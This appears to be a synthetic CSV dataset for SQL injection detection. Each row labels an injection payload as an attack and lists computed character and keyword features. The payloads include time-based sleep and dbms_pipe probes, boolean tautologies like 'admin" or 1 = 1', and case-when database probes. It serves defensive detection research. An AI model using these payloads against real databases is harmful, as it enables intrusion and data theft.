id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000957,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,7.900433725202216,243.10598754882812,63.92511749267578,35.424686431884766,10.497600555419922,-5.560140132904053,50.68672561645508,22.737674713134766,0.9980645179748535,0.32780495285987854,0.07136522233486176,0.4814324975013733,0.15140117704868317,4.2180047035217285,2.5123746395111084,-0.38903307914733887,0.670360267162323,0.32343417406082153,-0.13958314061164856,-0.1344953030347824,10.605036735534668,7.557751655578613,1.7826839685440063,-0.07155308127403259,2.3956797122955322,-0.18394650518894196,-0.02630762569606304,0.42496639490127563,2.146317958831787,0.27902528643608093,-0.05294686555862427,0.005810185335576534,0.4931720197200775,-0.062012918293476105,0.17312954366207123,1.5429753065109253,6.592785358428955,0.19414646923542023,0.9477713108062744,-0.3841407895088196,0.15073269605636597,0.6747996211051941,-0.03489663824439049,0.22913077473640442,-0.0982099175453186,-0.049685295671224594,0.013004958629608154,0.7399473190307617,0.7838338613510132,0.4560699462890625,0.4868415296077728,1.2610971927642822,0.9270597696304321,0.1857977658510208,-0.050101861357688904,-0.06532355397939682,0.09380035102367401,0.1675776094198227,0.06566144526004791,0.08831486105918884,0.01250464841723442,0.24810048937797546,0.002112410496920347,3.984283208847046,0.19613666832447052,0.14734341204166412,0.04377376660704613,0.25428691506385803,-0.00023094750940799713,-0.004776284098625183,0.039189741015434265,-0.020590070635080338,-0.008008940145373344,-0.04605817422270775,-0.005312544759362936,-0.10772860050201416,1.3410593271255493,-0.1659843623638153,0.018566377460956573,-0.30023834109306335,0.15181438624858856,12.13502025604248,0.26453864574432373,0.2284131646156311,0.2162814438343048,0.08193205296993256,0.03721083700656891,0.17683129012584686,0.009725893847644329
GAN_000958,attack,other,1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',nearest_attack_euclidean,R004253,10.234394142249432,134.50599670410156,62.32797622680664,40.59221649169922,-20.655128479003906,1.4367398023605347,1.0939277410507202,20.128259658813477,0.9989417195320129,0.26100054383277893,0.12774930894374847,0.4153887629508972,0.20180457830429077,3.792410135269165,0.13058246672153473,0.703975260257721,0.9195836186408997,0.15014392137527466,0.31722769141197205,-0.10399133712053299,6.752873420715332,1.6746816635131836,-1.839587688446045,-0.08143053203821182,2.3034677505493164,-0.31013810634613037,0.03488488122820854,-0.46614232659339905,1.0994797945022583,0.2234790027141571,0.01468754094094038,-0.05496526136994362,1.3355287313461304,-0.10904008895158768,-0.6474490165710449,2.28552508354187,7.106771945953369,-0.5971106886863708,2.308584213256836,-0.5031038522720337,0.6631682515144348,0.6531442999839783,0.14927534759044647,-0.01569577120244503,-0.16666746139526367,-0.003982010763138533,-0.04682803526520729,1.1059064865112305,1.4519751071929932,1.6436976194381714,1.2715306282043457,2.7335197925567627,0.11836105585098267,0.21508754789829254,-0.18439540266990662,-0.11279559880495071,0.12413415312767029,-0.20131902396678925,0.07111585140228271,0.21195554733276367,-0.0025894232094287872,0.4686478078365326,-0.0019654498901218176,0.7990936636924744,0.214528426527977,0.07401213049888611,0.2188384234905243,0.2084120512008667,0.3598025441169739,-0.01535088662058115,-0.06519624590873718,-0.026917273178696632,-1.0844745474969386e-06,0.16882306337356567,0.021711772307753563,-0.07655932754278183,0.496773362159729,-0.41910672187805176,0.027125312015414238,-0.09256879985332489,0.05633062496781349,14.412633895874023,0.13075627386569977,0.5179926156997681,0.23869360983371735,0.40948882699012756,0.02467728778719902,0.7590755224227905,0.042512115091085434
GAN_000959,attack,boolean,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji",nearest_attack_euclidean,R001622,3.108756210586524,153.23289489746094,45.5035514831543,23.09405517578125,69.68061065673828,-2.3146088123321533,38.28416061401367,30.092058181762695,0.9998225569725037,0.3159347474575043,0.0689525306224823,0.4570573568344116,0.17275270819664001,3.3338747024536133,2.8525781631469727,1.0701284408569336,0.3365887403488159,0.17370425164699554,-0.008523703552782536,-0.021881159394979477,8.013663291931152,8.016087532043457,2.72804856300354,0.011063852347433567,1.910779595375061,-0.03747668117284775,-0.05829800292849541,0.17738571763038635,0.5093179941177368,-0.09384263306856155,0.027627140283584595,-0.002446213038638234,0.2639414966106415,-0.08725839108228683,0.11004123836755753,1.7128098011016846,4.273708820343018,1.3953742980957031,0.553255021572113,-0.07239983975887299,-0.1598193198442459,-0.05591564625501633,-0.03330714628100395,0.036460790783166885,-0.04557989537715912,-0.0208611898124218,0.021661588922142982,-0.017887866124510765,0.11109790951013565,0.020410778000950813,0.09253869205713272,0.08287765830755234,0.5228068828582764,0.03657407686114311,-0.04955329746007919,-0.012016945518553257,-0.009435554035007954,0.15173044800758362,0.027688676491379738,0.07775719463825226,0.005519277416169643,-0.004376005381345749,0.010937759652733803,1.475945234298706,-0.041588738560676575,-0.01999763958156109,0.05126483738422394,0.1740570217370987,-0.02522098831832409,-0.0008797835325822234,0.02764296531677246,-0.00965303834527731,0.00042986703920178115,-0.042924363166093826,-0.01013401709496975,-0.08804444223642349,1.666619896888733,0.11716523766517639,-0.002120434772223234,0.08957814425230026,0.04515243321657181,3.271864175796509,0.731731653213501,-0.016606278717517853,0.03085600771009922,0.03049442172050476,0.023993665352463722,0.04477677494287491,0.011843600310385227
GAN_000960,attack,boolean,end and    (    (     (  'xzbk'  =  'xzbk,nearest_attack_euclidean,R007713,5.295302955272491,95.67068481445312,49.482120513916016,7.013613224029541,-6.7620849609375,-4.111452579498291,18.532182693481445,9.177680969238281,0.9993297457695007,0.3407606780529022,0.025104504078626633,0.4853397011756897,0.16061179339885712,3.334289073944092,3.175276517868042,-2.167393684387207,1.1449146270751953,0.24358661472797394,0.029936213046312332,-0.017841976135969162,5.161360740661621,3.043938398361206,0.7277738451957703,-0.027947669848799706,0.5774388909339905,-0.11843864619731903,0.0216768030077219,0.16446776688098907,0.41221117973327637,0.40423405170440674,0.05331789702177048,0.011293492279946804,-0.2683658301830292,0.0455595962703228,0.42324700951576233,0.3670237064361572,3.680576801300049,-0.10366968810558319,0.9272671341896057,-0.2037883847951889,-0.019298473373055458,0.45371946692466736,-0.04207620397210121,-0.050522465258836746,0.01874992437660694,-0.01750997081398964,-0.027049817144870758,0.3523980379104614,0.2657763361930847,0.2398412972688675,0.14482000470161438,0.6678420305252075,0.005444493144750595,0.031216280534863472,-0.06952863186597824,-0.045436542481184006,0.08267365396022797,0.04968544840812683,0.03467464819550514,0.08777191489934921,0.0004612177435774356,0.02677781879901886,-0.00593614811077714,1.3141427040100098,0.08175885677337646,-0.02069687470793724,-0.10065416991710663,0.13392281532287598,-0.13807007670402527,-0.0006262101233005524,-0.01625392585992813,-0.005047759972512722,-0.0018672446021810174,0.028133224695920944,0.003128886455669999,-0.022112863138318062,0.14900696277618408,-0.042982373386621475,-0.0018960171146318316,0.09810449182987213,0.0244461577385664,4.806251525878906,0.45016708970069885,0.097617506980896,-0.12314721941947937,0.00840684026479721,0.005548596847802401,-0.030455833300948143,0.004990415647625923
GAN_000961,attack,boolean,1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,nearest_attack_euclidean,R005946,7.4777480324178365,307.5179748535156,133.09605407714844,48.225284576416016,197.81961059570312,-2.311504364013672,67.83280944824219,72.81204223632812,1.0014595985412598,0.5224955677986145,0.08848892897367477,0.5416083931922913,0.14815594255924225,3.468736171722412,1.2427831888198853,-1.3048924207687378,2.1383485794067383,0.06722767651081085,0.19239304959774017,-0.024012476205825806,15.17805290222168,13.754637718200684,2.377336025238037,-0.03249070420861244,2.035748243331909,0.022335315123200417,-0.07834069430828094,0.1082913875579834,1.8228402137756348,-0.5216032862663269,0.11942232400178909,0.059431739151477814,-0.5048921704292297,0.15293888747692108,-0.2461758404970169,2.3210389614105225,11.756155014038086,-0.533494770526886,2.1106629371643066,-0.007737353909760714,-0.05469829589128494,1.2718572616577148,0.2738235592842102,-0.29445916414260864,-0.20428350567817688,-0.0024521478917449713,-0.1125563532114029,1.109972596168518,1.188760757446289,1.2067135572433472,1.3856223821640015,1.6273374557495117,-1.0209382772445679,-0.15385690331459045,0.056588660925626755,-0.01049190852791071,0.007309937849640846,0.0032502675894647837,-0.016133470460772514,0.8643609285354614,1.2398775652400218e-05,0.10232174396514893,0.0011411133455112576,0.9760177731513977,0.036972418427467346,-0.056137166917324066,-0.04244017228484154,-0.42649900913238525,1.0585309267044067,0.00345052988268435,0.048061881214380264,-0.002030779607594013,0.01114075630903244,0.15805202722549438,0.01737377606332302,0.11031309515237808,0.24859005212783813,-0.5965813398361206,-0.007590367458760738,0.21424080431461334,-0.2888045310974121,9.846115112304688,0.522135853767395,0.07133214920759201,0.0934634655714035,0.1831919252872467,0.04480314999818802,-0.12913551926612854,0.0636296346783638
GAN_000962,attack,time,1 or sleep  (  5  ) ,nearest_attack_euclidean,R003795,4.073145265227812,26.403505325317383,24.296371459960938,-0.2081817090511322,37.82746887207031,2.107104539871216,18.228479385375977,11.47337818145752,0.9998987913131714,0.3721911311149597,-0.005405414383858442,0.421257883310318,0.11606509238481522,2.8426461219787598,-0.16558943688869476,0.40128809213638306,0.08287011831998825,0.30140793323516846,0.16627804934978485,0.03343896567821503,1.9189643859863281,2.9170289039611816,0.8592052459716797,0.02795742265880108,0.5865947604179382,0.0631927102804184,0.010048050433397293,-0.03635752201080322,-0.8510375022888184,0.3769088685512543,0.000917060999199748,-0.01253936905413866,-0.009784509427845478,-0.21585440635681152,0.4525909721851349,0.1190381795167923,3.413159132003784,0.6601873636245728,0.2640213072299957,-0.11095578968524933,0.32278046011924744,0.36859944462776184,0.8010546565055847,-0.08502969890832901,0.061814866960048676,0.049410898238420486,-0.0021294185426086187,-0.052130077034235,-0.11945026367902756,0.1369141936302185,0.07228304445743561,-0.1366191953420639,0.064189612865448,-0.00811094045639038,0.011802437715232372,0.04348387196660042,0.06490220129489899,-0.12184514105319977,0.0010063489899039268,-0.26732128858566284,0.000964441045653075,0.015430357307195663,-0.0015053276438266039,0.4289245307445526,-0.05677143484354019,-0.0665544643998146,-0.06633296608924866,-0.04024745896458626,-0.13336722552776337,0.010700379498302937,-0.046507127583026886,0.0031005735509097576,0.0038957681972533464,0.04553908109664917,0.006671881768852472,-0.010636133141815662,0.15953481197357178,0.6676538586616516,-0.009180373512208462,0.29884976148605347,0.014675588347017765,0.7916843295097351,0.10012353956699371,-0.0008713535498827696,0.6519492268562317,-0.0786113366484642,-0.006258354056626558,-0.08609875291585922,0.012113985605537891
GAN_000963,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""uvoq"" like ""uvoq",nearest_attack_euclidean,R004679,12.41862044590574,-36.06446075439453,37.38237762451172,3.656390905380249,113.97195434570312,3.9067468643188477,47.49610900878906,18.92059898376465,0.9993924498558044,0.5668022036552429,-0.22637271881103516,0.5562154650688171,0.02082519792020321,3.5365660190582275,-2.1165127754211426,3.410102128982544,-0.13548298180103302,0.48649805784225464,0.3212825655937195,0.0030681551434099674,0.5508890151977539,8.426886558532715,-0.2470856010913849,0.07129723578691483,0.7938950061798096,0.28436481952667236,-0.030585231259465218,-0.5931416749954224,-1.4175022840499878,0.912492573261261,-0.1272321343421936,-0.009977462701499462,0.2771128714084625,-0.2728278934955597,0.6377583742141724,0.058102797716856,6.231199741363525,2.646846055984497,0.574380099773407,-0.0032716693822294474,0.43926045298576355,0.49049443006515503,2.6429407596588135,0.050495218485593796,0.23372380435466766,0.08038059622049332,0.07367150485515594,-0.1044091060757637,-0.04189224913716316,0.4924173951148987,0.3809863328933716,-0.5796849131584167,0.24573422968387604,-0.03831362724304199,-0.06310191005468369,0.15930581092834473,0.11107680946588516,-0.48884329199790955,-0.018238801509141922,-0.9945142269134521,0.011046386323869228,-0.06770822405815125,-0.0036232885904610157,0.825223982334137,-0.0729169249534607,-0.07320750504732132,-0.3235860764980316,-0.3064332604408264,-0.622464656829834,0.031543225049972534,-0.057512905448675156,0.015457279048860073,0.009073346853256226,0.0815301463007927,-0.01903669722378254,-0.12328705191612244,0.4891829490661621,2.0621368885040283,-0.026070300489664078,0.8341588377952576,0.1862219125032425,-1.1763116121292114,0.8083456158638,-0.10546133667230606,2.984278917312622,-0.032606810331344604,-0.08329269289970398,0.12446960061788559,-0.02929750457406044
GAN_000964,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R003016,9.244662402128329,171.18978881835938,54.29861831665039,17.92725372314453,-44.83232879638672,-9.653937339782715,55.25120162963867,3.2612829208374023,0.9977853298187256,0.2794342637062073,-0.022709865123033524,0.528069794178009,0.1301116943359375,4.182178497314453,4.625493049621582,-1.9158368110656738,-0.13310547173023224,0.33878716826438904,-0.19250907003879547,-0.11589164286851883,7.2675371170043945,3.25559139251709,2.2393205165863037,-0.080951027572155,1.3403102159500122,-0.22786834836006165,0.055528346449136734,1.588347315788269,1.1056996583938599,0.7198119163513184,-0.04555311053991318,0.0032687829807400703,0.6123017072677612,0.011473452672362328,0.23761655390262604,0.37373507022857666,3.3195624351501465,0.31603991985321045,0.7471056580543518,-0.36353689432144165,0.35694339871406555,0.9664156436920166,-0.14556485414505005,0.34399160742759705,0.10148467123508453,-0.010810257866978645,0.023348132148385048,0.7990447282791138,0.4724884331226349,0.18698444962501526,0.10815892368555069,1.023856520652771,0.7197460532188416,0.16155116260051727,-0.01647881232202053,-0.05950725078582764,0.19056536257266998,0.35690006613731384,0.07377325743436813,-0.2234167754650116,0.011416604742407799,-0.07332910597324371,-0.010033776983618736,3.798429250717163,0.18347704410552979,0.11105068027973175,0.0693972036242485,0.27235493063926697,-0.33566370606422424,-0.0011836549965664744,0.028443945571780205,-0.009350387379527092,-0.008552866987884045,-0.06311055272817612,0.002728055464103818,0.0030340689700096846,1.231534719467163,-0.41184061765670776,0.007097782101482153,-0.23166723549365997,0.23049716651439667,11.481512069702148,-0.06567345559597015,0.32068464159965515,0.17584937810897827,0.12947224080562592,0.03432919457554817,0.27771443128585815,-0.008876330219209194
GAN_000965,attack,other, (  select   (  case when   (  6714  =  8872  )   then 1 else 6714*  (  select 6714 from master..sysdatabases  )   end   )    ) ,nearest_attack_euclidean,R007461,8.25811979367682,70.51087188720703,35.951194763183594,10.9940185546875,-68.73863983154297,-2.3185477256774902,17.20855140686035,9.337258338928223,0.9991709589958191,0.3827216327190399,-0.02947293594479561,0.2885647118091583,0.1274143010377884,3.5398924350738525,1.1281731128692627,-2.484259605407715,-0.015404948964715004,0.69349205493927,0.1670781970024109,0.002273906022310257,3.3141632080078125,-3.5930726528167725,-0.647604763507843,-0.05584662780165672,0.3308410942554474,-0.2332116812467575,0.08553353697061539,0.8675829172134399,-0.3200763165950775,1.3563215732574463,0.09735275059938431,-0.020625507459044456,0.3187258243560791,0.1402178257703781,0.3913680613040924,0.24448497593402863,5.519999027252197,-1.0257275104522705,2.4540953636169434,-0.318877637386322,0.6643680334091187,1.3610039949417114,0.01593693718314171,0.04545969143509865,0.02671988122165203,0.10759053379297256,0.004397366661578417,0.41484540700912476,0.319012314081192,0.6806033253669739,0.26337695121765137,1.1635160446166992,-0.4145573377609253,0.15919120609760284,-0.031644102185964584,-0.061785392463207245,0.19902393221855164,-0.03706284239888191,0.04500138759613037,0.30508601665496826,-0.008122310042381287,-0.21159841120243073,-0.01934647187590599,-0.6754744052886963,0.03216193616390228,-0.038483597338199615,0.16823236644268036,-0.0017301542684435844,0.12443675845861435,-0.012075472623109818,-0.07044889777898788,-0.00994872022420168,-0.0001317076530540362,0.10394037514925003,0.029275819659233093,0.048751018941402435,0.16658279299736023,-0.33990371227264404,0.002721495693549514,-0.05810698866844177,0.09970895200967789,9.01856517791748,-0.10856781899929047,0.39167553186416626,0.05764555186033249,0.19133518636226654,0.05701238289475441,0.7431978583335876,0.034799523651599884
GAN_000966,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000141,4.019919027117018,4.746041297912598,20.571563720703125,3.109783887863159,-17.599014282226562,-1.3804938793182373,0.48800885677337646,-5.06903076171875,0.998927891254425,0.3273667097091675,0.1060008853673935,0.4181111454963684,0.11479759216308594,3.29160213470459,1.4379723072052002,1.221388816833496,0.060414839535951614,0.5627503395080566,0.05727048218250275,-0.019372519105672836,0.06706259399652481,1.6666362285614014,0.44380471110343933,0.0045991637744009495,0.7074474096298218,-0.01809283159673214,0.030403831973671913,-0.05915544927120209,-0.615364134311676,0.2070927917957306,-0.11655229330062866,0.04333874210715294,-0.25550028681755066,0.10044816881418228,0.44395729899406433,0.39172065258026123,0.0328240729868412,1.1531705856323242,-0.004507261328399181,-0.11645762622356415,-0.08049226552248001,0.09595776349306107,0.2480337917804718,0.049966566264629364,0.11851206421852112,-0.012767547741532326,-0.016428213566541672,0.10079920291900635,-0.00865422748029232,-0.06413422524929047,-0.19017434120178223,0.04746909812092781,0.3346831500530243,0.016499729827046394,-0.03359300643205643,0.0044282423332333565,0.020804645493626595,-0.05266907438635826,-0.006266493815928698,-0.37161189317703247,0.006173066329210997,-0.256076842546463,-0.004803666844964027,0.5920915007591248,0.06279520690441132,-0.012078776024281979,-0.034334633499383926,-0.03833615407347679,-0.49530044198036194,0.005529990419745445,0.007207118906080723,0.0041788676753640175,-0.00015213976439554244,-0.003390856087207794,0.0011380031937733293,-0.04298217222094536,0.6751850843429565,0.6596623659133911,0.0012332743499428034,0.16725333034992218,0.0663883164525032,-0.4047589898109436,0.8610255718231201,-0.08134917169809341,0.28926271200180054,-0.02930215746164322,0.0024890010245144367,-0.07857012003660202,-0.004663703963160515
GAN_000967,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",nearest_attack_euclidean,R000813,3.5502922892949744,97.15900421142578,54.3773078918457,1.9495331048965454,26.57726287841797,-2.546001672744751,25.367883682250977,19.894901275634766,1.0001388788223267,0.4187796115875244,0.030011456459760666,0.3949204087257385,0.1591402143239975,3.2525415420532227,1.4361770153045654,-0.799679160118103,0.7170512676239014,0.0397203266620636,0.10009624063968658,0.008992036804556847,5.53127908706665,3.8468687534332275,1.5181995630264282,-0.002920313272625208,0.18293121457099915,-0.04255518317222595,0.003387219738215208,0.3465022146701813,-0.40883126854896545,0.1822344809770584,0.0707705095410347,0.012116633355617523,-0.4580095708370209,0.05406904220581055,0.12087080627679825,0.1725374013185501,4.2855730056762695,-0.3063865602016449,0.8503850102424622,-0.06874947249889374,-0.018910447135567665,0.5450380444526672,0.011669370345771313,-0.0862131416797638,-0.008397179655730724,0.021675685420632362,-0.038906946778297424,0.15893219411373138,0.08225950598716736,0.1788301318883896,0.11099103093147278,0.3621111214160919,-0.16659581661224365,-0.04381749406456947,-0.023132117465138435,-0.010212382301688194,0.046915583312511444,0.11389228701591492,0.004964878782629967,0.2643398642539978,-0.002176523208618164,-0.09453372657299042,-0.0004902483779005706,-0.3722485601902008,-0.02829642966389656,-0.07730995863676071,-0.06758949160575867,0.029947888106107712,-0.09465574473142624,-0.003701817011460662,-0.0052198083139956,-0.0038126271683722734,0.0006483906763605773,0.038282882422208786,0.006004958413541317,-0.025148624554276466,0.005618784110993147,-0.21083492040634155,-0.007271948270499706,0.16000020503997803,-0.06488336622714996,1.202910304069519,0.3536008596420288,-0.032411955296993256,-0.0862867534160614,-0.02515595406293869,0.030692828819155693,-0.10433312505483627,0.012004660442471504
GAN_000968,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R005065,6.246328915772788,10.297066688537598,26.42578125,3.2265784740448,69.36382293701172,4.09962272644043,28.74444580078125,13.483091354370117,0.9999017715454102,0.40409722924232483,-0.02527676895260811,0.4317360520362854,0.07486675679683685,3.443049430847168,-1.6119738817214966,1.9814072847366333,-0.6562814116477966,0.5682746171951294,0.20872974395751953,0.031325556337833405,1.199538230895996,4.9102559089660645,0.1877586543560028,0.042149223387241364,0.8377774357795715,0.14930707216262817,-0.007413854356855154,-0.2244092971086502,-1.1844075918197632,0.4642942547798157,-0.009809167124330997,-0.030802186578512192,0.2397056519985199,-0.1631418764591217,0.6068629026412964,0.2697135806083679,4.500720500946045,1.0256297588348389,0.6045962572097778,-0.11235444247722626,0.6230038404464722,0.5021587610244751,1.3763636350631714,-0.0334734246134758,0.13110314309597015,0.09839364886283875,0.029534824192523956,-0.12878425419330597,-0.11912652105093002,0.24516987800598145,0.2248995006084442,-0.3640489876270294,0.21941861510276794,-0.03098391555249691,0.0031196605414152145,0.08318637311458588,0.08071719110012054,-0.19375358521938324,-0.007181663531810045,-0.4584435522556305,0.005669183563441038,0.052548836916685104,0.00020728388335555792,0.25274601578712463,-0.1002318412065506,-0.0728016123175621,-0.10240671038627625,-0.1581311821937561,-0.20146311819553375,0.017420055344700813,-0.05737566575407982,0.008558467030525208,0.006289112847298384,0.0656324252486229,0.0065126982517540455,-0.03636370226740837,0.4844476878643036,0.9144508838653564,-0.014033646322786808,0.4744202792644501,0.07411296665668488,-0.2741766571998596,0.23543818295001984,-0.04872218519449234,1.4236575365066528,-0.05724252760410309,-0.04257434606552124,0.07927338778972626,0.011439140886068344
GAN_000969,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R007369,7.007168634878848,0.9859248399734497,26.292762756347656,2.587571859359741,66.76814270019531,3.28627347946167,32.9489631652832,20.583892822265625,1.0000877380371094,0.21872347593307495,0.011879067867994308,0.42382586002349854,0.21787436306476593,3.192946434020996,1.3148385286331177,2.7339892387390137,0.39808839559555054,-0.23027510941028595,0.3156110346317291,0.023089952766895294,1.388347864151001,6.515181064605713,1.9428634643554688,0.08406412601470947,1.2144004106521606,0.04550778120756149,-0.020987967029213905,-0.6921417713165283,-0.8044247627258301,0.3494625687599182,-0.0278948787599802,-0.06635352969169617,1.161170482635498,-0.2902856469154358,0.449924498796463,0.9008093476295471,4.877375602722168,2.5191731452941895,0.8665781617164612,-0.1647762805223465,-0.09729257971048355,-0.3792029619216919,1.2776365280151367,-0.08851534128189087,0.10798235982656479,0.07577809691429138,0.08688408881425858,-0.3751325309276581,-0.15964190661907196,0.1828892081975937,0.19072367250919342,-0.5406890511512756,0.7856918573379517,0.024420568719506264,-0.11711355298757553,0.07421265542507172,0.06866918504238129,-0.07458081841468811,0.023953625932335854,-0.5094289183616638,0.004632240626960993,0.1841612607240677,0.017164699733257294,2.529794931411743,-0.1938605010509491,-0.09246431291103363,0.07891665399074554,0.1952129453420639,0.23242194950580597,0.0086517333984375,-0.09754932671785355,-0.0055372887291014194,0.010721891187131405,0.041801124811172485,-0.012631760910153389,-0.1484881043434143,2.2292184829711914,0.16306118667125702,-0.022191446274518967,0.868621826171875,0.18135730922222137,1.3337661027908325,0.18890731036663055,0.07357138395309448,1.3885818719863892,0.0022851601243019104,-0.010979775339365005,0.23983977735042572,0.03592900559306145
GAN_000970,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R005904,6.266343919500223,-30.04811668395996,16.876787185668945,-9.013381958007812,-46.99115753173828,-2.028982400894165,2.726126194000244,-1.6127872467041016,0.9980924129486084,0.2971302270889282,-0.1550973355770111,0.4716421365737915,0.22370333969593048,2.5947935581207275,5.5925517082214355,0.45666560530662537,0.13896094262599945,0.4471761882305145,0.042738091200590134,-0.03418843448162079,-0.9596199989318848,0.303814172744751,-0.34783580899238586,0.03474533185362816,0.30052778124809265,-0.07044253498315811,0.06419814378023148,-0.04630391299724579,-0.3580549657344818,1.0245089530944824,-0.1282360553741455,0.022437676787376404,-0.14616042375564575,-0.06418778002262115,0.4080772399902344,-0.024495886638760567,0.9289568066596985,3.0183207988739014,0.5010140538215637,-0.031731829047203064,-0.34955668449401855,0.13162517547607422,0.6585471034049988,-0.04754561558365822,0.10713127255439758,-0.01975250244140625,0.01917175203561783,0.04774290695786476,-0.1390255242586136,0.12292936444282532,-0.19366240501403809,0.13820569217205048,0.45216721296310425,0.07322944700717926,-0.06269921362400055,0.008106747642159462,0.017173126339912415,-0.2728576362133026,0.0334385521709919,-0.6539564728736877,0.009788108058273792,-0.20570328831672668,-0.01233705971390009,1.7290246486663818,0.12462204694747925,-0.0075499820522964,-0.0728575587272644,-0.17939789593219757,-0.5492294430732727,0.009895773604512215,-0.0471041314303875,0.00017552223289385438,0.004820141475647688,0.04661501571536064,-0.008736439049243927,-0.09131776541471481,0.46339720487594604,1.2643208503723145,-0.007432885468006134,0.20701956748962402,0.13754874467849731,2.329888343811035,0.4778001606464386,-0.054545171558856964,0.5305817127227783,-0.08674625307321548,-0.010517053306102753,0.141217440366745,-0.0006850737845525146
